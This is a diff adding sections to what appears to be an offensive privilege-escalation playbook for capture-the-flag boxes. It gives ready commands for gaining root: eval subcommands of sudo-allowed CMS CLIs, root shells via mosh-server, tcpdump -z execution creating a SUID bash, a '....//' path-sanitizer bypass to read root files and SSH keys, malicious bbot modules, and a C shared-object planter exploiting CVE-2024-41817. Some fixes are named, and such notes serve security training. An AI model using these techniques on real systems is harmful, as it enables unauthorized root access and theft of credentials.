@@ -82,6 +82,38 @@ sudo BASH_ENV=/tmp/x.sh <the-allowed-script>; /bin/bash -p`. Read the whole
 the script's own logic is irrelevant. (`ENV` is the POSIX-sh equivalent for
 `/bin/sh`→dash scripts.)
 
+**A sudo-allowed application/site CLI is a root shell through its own
+subcommands — these are not on GTFOBins, so check them by hand.** When the
+allowed binary is the management CLI of a framework or CMS rather than a Unix
+tool, GTFOBins is silent, but the tool almost always ships a subcommand that
+evaluates code or SQL after bootstrapping the app: Drupal `drush php:eval` /
+`drush sql-query`, Backdrop `bee eval` / `bee sql`, WordPress `wp eval` /
+`wp shell`, Laravel `php artisan tinker`, Rails `rails runner` / `rake`,
+Django `manage.py shell -c`, `npm`/`composer` run-scripts, `gem`/`pip` with a
+build hook. Any one of these under `sudo (ALL) /path/to/cli` is arbitrary code as
+root. Read the tool's subcommand list (`<cli> --help`) and look for `eval`,
+`php`, `shell`, `runner`, `sql`/`sql-query`, `run`, `exec`. Two operational
+notes: these CLIs usually must be invoked from the application's own directory so
+they can find and bootstrap the install (`cd /var/www/html` first), and the
+escalation is a *documented feature* — name the blanket sudo rule as the finding,
+not the tool. *Compact example:* `cd /var/www/html && sudo /usr/local/bin/bee
+eval 'system("id");'` → uid=0. *(Backdrop `bee`)*
+
+**A sudo-allowed binary whose *job* is to spawn a session is a root shell —
+even when GTFOBins has no entry for it.** Separate from code-eval CLIs: some
+programs exist precisely to hand a connecting client an interactive login shell
+(`mosh-server`, `screen`, `tmux`, `script`, `byobu`, `expect`, a getty). Run one
+under sudo and the shell it spawns is root's. Don't look for a flag trick — use
+the program as designed, then attach its client. The tell is in the man page
+("starts a shell", "new session"), not on GTFOBins. For `mosh-server` the dance
+is two-step and non-interactive-hostile: `sudo mosh-server new` prints
+`MOSH CONNECT <port> <key>`; then `MOSH_KEY=<key> mosh-client 127.0.0.1 <port>`
+drops you to root. To script it, wrap mosh-client in a pty (`script -qc "stty
+rows 40 cols 120; mosh-client …" /dev/null < cmdfile`) — it aborts with
+`Framebuffer … Assertion 's_height > 0'` on a zero-size pty — and have the root
+shell `chmod u+s /bin/bash` so the rest of the run is a plain `bash -p`. Name the
+blanket sudo rule as the finding; the binary is behaving exactly as documented.
+
 **On openSUSE, `(ALL) ALL` + `Defaults targetpw` is the distro default, not a
 grant.** It means *any* user may run anything — **after supplying the target
 (root) password**, which you do not have. Do not read it as "already won"; read it
@@ -134,6 +166,16 @@ nc -u -w1 127.0.0.1 N`, and drop a root-owned `/etc/sudoers.d/<uuid>` (visudo
 tolerates the pcap junk on line 1 and applies your rule on the next). Don't
 conclude a constrained `-w`+priv-drop is a dead end before testing flag injection
 through the wildcard.
+
+**When the rule is *unconstrained* (`NOPASSWD: /usr/sbin/tcpdump` with no fixed
+args), skip the flag-smuggling entirely — `-z <cmd>` is direct command execution
+as root.** tcpdump runs the `-z` post-rotate handler on every savefile rotation,
+as the privileged user, with the rotated filename as an arg. Force one immediate
+rotation: `sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x.sh -Z root`
+where `/tmp/x.sh` does `cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb` (then
+`/tmp/rb -p`). This is the GTFOBins path and the first thing to try whenever
+`sudo -l` shows tcpdump without a locked argument list — the wildcard-injection
+method above is only for rules that *do* pin the options.
 
 `(ALL, !root)` in older sudo → CVE-2019-14287, `sudo -u#-1 /bin/bash`.
 Sudo `< 1.9.5p2` → Baron Samedit (CVE-2021-3156), a heap overflow reachable with
@@ -969,6 +1011,43 @@ destination-length and depth-to-root to the real staging path. Keep the box-spec
 recipe in `local.md`; the transferable rule is **"extract-as-root + old interpreter
 = arbitrary write, even with a filter set."**
 
+## Root wrapper that *sanitizes then re-reads* an attacker-controlled path (strip-and-write-back)
+
+A common "safe" shape for a `sudo` backup/archive/deploy wrapper: read a path (or a
+JSON field of paths) from a file you supply, **strip the dangerous bit once**, write
+the cleaned value **back to the same file**, check it against an allow-list, then
+hand the *file* to a root tool that re-reads it. Three independent weaknesses to
+check, in order:
+
+1. **The strip is a single, non-recursive pass.** `sed 's|\.\./||g'`,
+   `str.replace("../","")`, `jq 'gsub("\\.\\./";"")'` all remove `../` *once* — so a
+   token that *becomes* `../` after one removal survives. `....//` → `../`;
+   `..././` → `../`. Feed `/allowed/....//....//target`: after the pass it is
+   `/allowed/../../target`, which still begins with the allowed prefix (the
+   allow-list is checked on the *post-strip* string) yet escapes to `/target`. This
+   is the same `....//` bypass the traversal notes use — it applies to privesc any
+   time the sanitizer is a fixed-string removal rather than `realpath`.
+2. **The write-back is load-bearing — so its *filesystem location* matters.** The
+   root tool re-reads the file from disk; the cleaned value only reaches it if
+   step-2's write succeeds. If that write fails you silently feed the tool your raw
+   (un-normalized) value, which usually just errors. **EACCES on a write while
+   running as root is the AppArmor tell**: a confined helper (and a backup tool that
+   only ever touches `/home` and `/var` is a prime candidate) is denied writes
+   outside its profile — and the script's own allow-list paths name the permitted
+   dirs. Stage your input file *under one of those allowed directories* (not `/tmp`)
+   and the write-back lands.
+3. **Where does the output go, and who can read it?** A root archive of a directory
+   you chose, dropped world-readable into a dir you control, is game over without
+   ever needing a shell: extract it for `root.txt` and `~root/.ssh/id_*`. Check the
+   output file's mode.
+
+The fix to name is `realpath`/`readlink -f` + a prefix-containment test on the
+*resolved* path (recursive strip or outright rejection of `..`), and non-world-
+readable backup output. Keep the box-specific JSON in `local.md`; the transferable
+rule is **"a one-pass path sanitizer is not containment, and a root helper that
+can't write outside /home,/var is telling you its own confinement."**
+*(code.htb: `sudo backy.sh` → `jq gsub` one-pass + `/var/....//....//root`.)*
+
 ## sudo a tool that loads user-supplied code (facter, and the class)
 
 A `sudo` grant for a program that *loads code or plugins* is root, even when the
@@ -1001,6 +1080,21 @@ language or loads modules/config from an attacker-controllable path — Ruby
 (`facter`, `rake -f`, `gem`), Python (`-c`, `PYTHONPATH`, `ansible` module dirs),
 Perl, Lua, or any `--config`/`--include` that pulls executable content. If it does,
 that is the root primitive, no memory-corruption needed.
+
+**Recon/automation frameworks that load modules or templates from a path you
+name are the same primitive.** A config/preset key that points the tool at a
+"custom modules" / "custom templates" directory makes it `import`/`exec` files
+from there: the import itself is code exec as whoever runs the tool. Read the
+loader to tell a *metadata-only* scan (`ast.parse`, safe) from an actual *load*
+(`importlib.spec_from_file_location`+`exec_module`, runs) — only the second is
+the sink, and it fires when the module is *enabled*, so you usually need to both
+drop the file in the dir and name it in the enable list, plus whatever minimal
+target makes the tool start work. Same shape as Terraform `dev_overrides`,
+Ansible `library`/`module_utils`, nuclei custom templates. *Compact example —
+bbot:* a preset's top-level `module_dirs:` + `modules: [pwn]` makes `sudo bbot -p
+p.yml -t x` import `pwn.py` as root; payload in module top-level and/or
+`async def setup`. The module needs valid `watched_events`/`produced_events` so
+the AST preload accepts it.
 
 **The cleanest instance is a config that *is* a command list.** Backup,
 configuration-management and job-runner tools (npbackup, borgmatic, restic
@@ -1302,6 +1396,52 @@ regardless of which action is chosen or what the branch would have refused. When
 scanning a writable-module target, enumerate the sub-commands and their guards
 separately from the import list — the weakest sub-command sets the bar, not the
 one whose name matches the module you can write.
+
+## A native tool that resolves a library or config from its CWD + a root job that `cd`s into a writable dir
+
+The interpreter section above is about an *import path*. The same failure has a
+compiled-binary form that is easy to miss because `ls -l` of the script shows a
+tool you cannot write and a directory that *is* root-owned at the top level: the
+privilege comes from a root job doing `cd <attacker-writable-dir>` and then
+running a native tool whose **dynamic-library, config, delegate or plugin search
+includes the current directory**. Drop a file the tool opens by a bare relative
+name — most powerfully a shared object it `dlopen`s by soname — into that CWD and
+your code runs as root. A `__attribute__((constructor))` fires at load, before
+the tool does any real work, so the job still completes and nothing looks broken.
+
+The method, independent of the specific product:
+
+1. For any root-scheduled job (cron, systemd timer, `run-parts`), read the
+   script: note every `cd <dir>` and the tool it then runs. The lever is a `<dir>`
+   that is group-/world-writable by an account you hold (`drwxrwx--- root:<grp>`
+   counts — check your groups), not that the tool is SUID.
+2. Decide what the tool loads relatively. `ltrace -e 'open*+dlopen'` / `strace -f
+   -e openat` the tool in a scratch dir and watch for `./name`, a bare soname
+   resolved against `.`, or a config/delegate file opened without an absolute
+   path. An empty `LD_LIBRARY_PATH`/`MAGICK_CONFIGURE_PATH`/`*_PLUGIN_PATH` that
+   the loader treats as "the cwd" is the classic enabler.
+3. Prove it benign first: plant a `.so` with that exact name whose constructor
+   writes `id` to a world-readable path, wait one cycle, confirm `uid=0`. Only
+   then swap in the payload (SUID `/bin/bash`, or an egress-free action).
+
+```bash
+# generic shared-object planter (name = whatever the tool loads from CWD)
+cat > x.c <<'EOF'
+__attribute__((constructor)) void i(){ system("id>/tmp/p 2>&1"); }
+EOF
+gcc -shared -fPIC -o <writable-cwd>/<soname> x.c    # e.g. libxcb.so.1
+# wait for the root job; then: cat /tmp/p -> uid=0 -> replace with SUID-bash payload
+```
+
+Example of the class: ImageMagick ≤ 7.1.1-35 (**CVE-2024-41817**) loads
+config/shared libs from the process CWD, so a root `magick identify` run with
+`cd` into a developer-writable images dir loads a planted `libxcb.so.1`. Same
+shape elsewhere: any tool with `.` on its library/plugin/config search path
+(unset or empty `LD_LIBRARY_PATH`, a `delegates.xml`/config looked up relatively,
+a plugin dir defaulting to cwd). Mitigation to recommend: run the job from a
+fixed root-owned directory, drop the group-write on the data dir, and pin the
+tool's library/config path to absolute root-owned locations (upgrade ImageMagick
+to ≥ 7.1.1-36 for that instance).
 
 ## Root executes a signature-verified binary you can write — steal the key, reverse the scheme
 
